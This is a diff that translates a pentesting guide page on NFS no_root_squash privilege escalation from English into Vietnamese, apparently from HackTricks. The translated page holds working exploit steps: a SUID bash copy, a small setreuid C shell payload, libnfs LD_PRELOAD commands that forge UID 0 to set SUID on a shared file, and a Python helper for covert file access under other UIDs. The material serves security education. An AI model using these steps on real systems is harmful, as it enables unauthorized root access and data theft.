@@ -1,32 +1,32 @@
-# NFS No Root Squash Misconfiguration Privilege Escalation
+# NFS No Root Squash: Leo thang đặc quyền do cấu hình sai
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Squashing Basic Info
+## Thông tin cơ bản về Squashing
 
-With NFS AUTH_SYS/AUTH_UNIX, the server bases file-permission checks on the `uid` and `gid` supplied in each RPC request. Other security flavors, such as Kerberos, use different credentials, and the server can map numeric credentials before checking permissions.<sup>[[4]](#references)[[5]](#references)</sup>
+Với NFS AUTH_SYS/AUTH_UNIX, máy chủ dựa vào `uid` và `gid` được cung cấp trong mỗi yêu cầu RPC để kiểm tra quyền truy cập tệp. Các security flavor khác, chẳng hạn như Kerberos, sử dụng thông tin xác thực khác và máy chủ có thể ánh xạ thông tin xác thực dạng số trước khi kiểm tra quyền.<sup>[[4]](#references)[[5]](#references)</sup>
 
-- **`all_squash`**: Maps every UID and GID to the anonymous account, which defaults to `nobody` (65534) on Linux. `no_all_squash` is the default for non-root requests.<sup>[[4]](#references)</sup>
-- **`root_squash`**: This is the default on Linux and maps requests with UID/GID 0 (root) to the anonymous account; other UIDs and GIDs are not squashed.<sup>[[4]](#references)</sup>
-- **`no_root_squash`**: Disables root squashing, so requests with UID/GID 0 can be evaluated as root on the server.<sup>[[4]](#references)</sup>
+- **`all_squash`**: Ánh xạ mọi UID và GID sang tài khoản anonymous, mặc định là `nobody` (65534) trên Linux. `no_all_squash` là mặc định đối với các yêu cầu không phải root.<sup>[[4]](#references)</sup>
+- **`root_squash`**: Đây là mặc định trên Linux, ánh xạ các yêu cầu có UID/GID 0 (root) sang tài khoản anonymous; các UID và GID khác không bị squash.<sup>[[4]](#references)</sup>
+- **`no_root_squash`**: Tắt root squashing, do đó các yêu cầu có UID/GID 0 có thể được máy chủ xử lý với quyền root.<sup>[[4]](#references)</sup>
 
-If an allowed client can mount a writable export in **`/etc/exports`** configured with **`no_root_squash`**, its UID/GID 0 requests can write there as the server's root user.<sup>[[4]](#references)</sup>
+Nếu một client được phép mount một export có quyền ghi trong **`/etc/exports`** được cấu hình với **`no_root_squash`**, các yêu cầu UID/GID 0 của client đó có thể ghi vào đó với quyền root của máy chủ.<sup>[[4]](#references)</sup>
 
-`root_squash` only remaps UID/GID 0; under AUTH_SYS, a permitted client's **nonzero numeric UID/GID** can still match a different account on the server. A writable export can therefore become a cross-user path even with root squashing if the client can create a file as that numeric identity and the server permits access. For a SUID/SGID handoff, also verify the resulting file owner, executable access, server mount's `nosuid` state, ACLs, and SELinux or other policy. The exported pathname, `rw` option, or matching number alone does not prove the client is allowed, the export is active, or that the two hosts share the same effective identity mapping. Inspect `/etc/exports` and local metadata passively; do not mount a new share or create a test file during enumeration.<sup>[[4]](#references)[[5]](#references)</sup>
+`root_squash` chỉ ánh xạ lại UID/GID 0; với AUTH_SYS, **UID/GID dạng số khác 0** của một client được phép vẫn có thể khớp với một tài khoản khác trên máy chủ. Vì vậy, ngay cả khi bật root squashing, một export có quyền ghi vẫn có thể trở thành đường dẫn truy cập chéo người dùng nếu client có thể tạo tệp với danh tính số đó và máy chủ cho phép truy cập. Đối với việc chuyển giao bằng SUID/SGID, hãy xác minh thêm chủ sở hữu của tệp sau khi tạo, quyền thực thi, trạng thái `nosuid` của mount trên máy chủ, ACL và SELinux hoặc các chính sách khác. Chỉ riêng đường dẫn được export, tùy chọn `rw` hoặc số UID/GID trùng khớp không chứng minh rằng client được phép truy cập, export đang hoạt động hoặc hai máy chủ có cùng cách ánh xạ danh tính hiệu lực. Kiểm tra thụ động `/etc/exports` và metadata cục bộ; không mount share mới hoặc tạo tệp thử nghiệm trong quá trình liệt kê.<sup>[[4]](#references)[[5]](#references)</sup>
 
-For more information about **NFS** check:
+Để biết thêm thông tin về **NFS**, hãy xem:
 
 {{#ref}}
 ../../network-services-pentesting/nfs-service-pentesting.md
 {{#endref}}
 
-## Privilege Escalation
+## Leo thang đặc quyền
 
-### Remote Exploit
+### Exploit từ xa
 
-Option 1 using bash:
-- On an allowed client, mount a writable export as root, copy **`/bin/bash`** into it, set its **SUID** bit, and execute it from a victim mount that does not use `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
-    - For the uploaded file to remain owned by root, the server must use **`no_root_squash`**. If root is squashed, a SUID binary for another account is possible only when the client can legitimately create or own it with that account's numeric UID/GID.<sup>[[4]](#references)</sup>
+Tùy chọn 1 sử dụng bash:
+- Trên một client được phép, mount export có quyền ghi với tư cách root, sao chép **`/bin/bash`** vào đó, đặt bit **SUID**, rồi thực thi tệp từ một mount trên máy nạn nhân không sử dụng `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
+    - Để tệp đã tải lên vẫn thuộc sở hữu của root, máy chủ phải sử dụng **`no_root_squash`**. Nếu root bị squash, chỉ có thể tạo binary SUID cho một tài khoản khác khi client có thể hợp lệ tạo tệp hoặc sở hữu tệp đó bằng UID/GID dạng số của tài khoản ấy.<sup>[[4]](#references)</sup>
 
 ```bash
 #Attacker, as root user
@@ -41,9 +41,9 @@ cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
 
-Option 2 using compiled C code:
-- Mount the directory from an allowed client, copy in a compiled payload that abuses SUID permissions, set its **SUID** bit, and execute it from the victim (see some [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
-    - Same restrictions as before
+Option 2 sử dụng mã C đã biên dịch:
+- Mount thư mục từ một client được phép, sao chép payload đã biên dịch khai thác quyền SUID vào đó, đặt bit **SUID** và thực thi payload từ máy nạn nhân (xem một số [payload C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
+    - Các hạn chế tương tự như trước đây
 
 ```bash
 #Attacker, as root user
@@ -59,20 +59,20 @@ cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
 
-### Local Exploit
+### Khai thác cục bộ
 
 > [!TIP]
-> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
-> The following trick is useful when `/etc/exports` restricts the export to the victim's IP: the remote client cannot mount it, but the local technique can operate through the share already mounted on the allowed host.<sup>[[2]](#references)</sup>\
-> For this unprivileged libnfs method, the export in **`/etc/exports`** must use the `insecure` flag so the process can use a non-reserved source port; `secure` is the default, although a process able to bind a reserved port does not need this option.<sup>[[1]](#references)[[4]](#references)</sup>
+> Lưu ý rằng nếu bạn có thể tạo **tunnel từ máy của mình đến máy nạn nhân, bạn vẫn có thể dùng phiên bản Remote để khai thác việc leo thang đặc quyền bằng cách tunnel các cổng cần thiết**.\
+> Mẹo sau hữu ích khi `/etc/exports` giới hạn quyền export cho IP của nạn nhân: client từ xa không thể mount thư mục này, nhưng kỹ thuật cục bộ có thể hoạt động thông qua share đã được mount trên máy chủ được cho phép.<sup>[[2]](#references)</sup>\
+> Với phương pháp libnfs không cần đặc quyền này, export trong **`/etc/exports`** phải dùng cờ `insecure` để tiến trình có thể sử dụng cổng nguồn không dành riêng; `secure` là mặc định, nhưng tiến trình có thể bind một cổng dành riêng thì không cần tùy chọn này.<sup>[[1]](#references)[[4]](#references)</sup>
 
-### Basic Information
+### Thông tin cơ bản
 
-An NFSv3 AUTH_UNIX client includes its effective UID, GID, and groups in each call, and the server uses them for permission checks. This local technique abuses that model by forging the RPC credentials through [libnfs](https://github.com/sahlberg/libnfs); its preload module supports overriding the UID/GID in the NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
+Client NFSv3 AUTH_UNIX gửi kèm UID, GID hiệu lực và các nhóm trong mỗi lời gọi, còn server sử dụng các thông tin này để kiểm tra quyền. Kỹ thuật cục bộ này khai thác cơ chế đó bằng cách giả mạo thông tin xác thực RPC thông qua [libnfs](https://github.com/sahlberg/libnfs); module preload của thư viện hỗ trợ ghi đè UID/GID trong ngữ cảnh NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
-#### Compiling the Library
+#### Biên dịch thư viện
 
-The libnfs example may require adjustments for the target kernel; the walkthrough used here specifically notes commenting out the fallocate syscalls before compiling the preload module.<sup>[[1]](#references)[[2]](#references)</sup>
+Ví dụ libnfs có thể cần điều chỉnh cho kernel mục tiêu; hướng dẫn được dùng ở đây ghi rõ cần chú thích các syscall fallocate trước khi biên dịch module preload.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```bash
 ./bootstrap
@@ -81,11 +81,11 @@ make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
 
-#### Conducting the Exploit
+#### Thực hiện exploit
 
-The example creates a small C helper that launches a shell, then places it on the share and uses `ld_nfs.so` with UID 0 in the NFS context to make it SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
+Ví dụ này tạo một chương trình trợ giúp C nhỏ để khởi chạy shell, sau đó đặt chương trình này trên share và dùng `ld_nfs.so` với UID 0 trong ngữ cảnh NFS để biến nó thành SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
 
-1. **Compile the exploit code:**
+1. **Biên dịch mã exploit:**
 
 ```bash
 cat pwn.c
@@ -93,7 +93,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Place the exploit on the share and modify its permissions by faking the UID**.<sup>[[1]](#references)[[2]](#references)</sup>
+2. **Đặt exploit lên thư mục chia sẻ và sửa quyền của nó bằng cách giả mạo UID**.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
@@ -102,16 +102,16 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **Execute the exploit to gain root privileges**.<sup>[[2]](#references)</sup>
+3. **Thực thi exploit để giành quyền root**.<sup>[[2]](#references)</sup>
 
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-### Bonus: NFShell for Stealthy File Access
+### Thưởng thêm: NFShell để truy cập tệp một cách kín đáo
 
-Once root access is obtained, this `nfsh.py` pattern sets the effective UID to the target file's UID before running a command, allowing access without recursively changing ownership.<sup>[[2]](#references)</sup>
+Sau khi có quyền truy cập root, mẫu `nfsh.py` này đặt effective UID thành UID của tệp mục tiêu trước khi chạy lệnh, cho phép truy cập mà không cần thay đổi quyền sở hữu đệ quy.<sup>[[2]](#references)</sup>
 
 ```python
 #!/usr/bin/env python
@@ -132,7 +132,7 @@ os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
 
-Run like:
+Chạy như sau:
 
 ```bash
 # ll ./mount/
@@ -142,9 +142,8 @@ drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ## References
 
 - [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
-- [2] [A tale of a lesser known NFS privesc](https://www.errno.fr/nfs_privesc.html)
+- [2] [Câu chuyện về một cách leo thang đặc quyền NFS ít được biết đến](https://www.errno.fr/nfs_privesc.html)
 - [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
-- [4] [exports(5) — Linux manual page](https://man7.org/linux/man-pages/man5/exports.5.html)
-- [5] [RFC 1813: NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
-
+- [4] [exports(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
+- [5] [RFC 1813: Đặc tả giao thức NFS phiên bản 3](https://datatracker.ietf.org/doc/html/rfc1813)
 {{#include ../../banners/hacktricks-training.md}}
